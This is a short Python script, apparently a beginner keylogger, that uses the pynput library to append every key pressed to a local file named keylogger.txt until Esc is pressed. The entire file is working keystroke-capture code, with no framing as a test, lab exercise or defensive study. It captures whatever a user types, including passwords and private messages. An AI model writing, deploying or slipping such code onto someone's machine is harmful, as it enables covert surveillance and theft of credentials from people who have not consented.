import pynput.keyboard

def press_key (key):
    with open ("keylogger.txt", "a") as file:
        try:
            file.write('{0}'.format(key.char))
        except AttributeError:
            file.write('{0}'.format(key))

def release_key (key):
    if key == pynput.keyboard.Key.esc:
        return False
    
with pynput.keyboard.Listener(on_press=press_key, on_release=release_key) as listener:
    listener.join()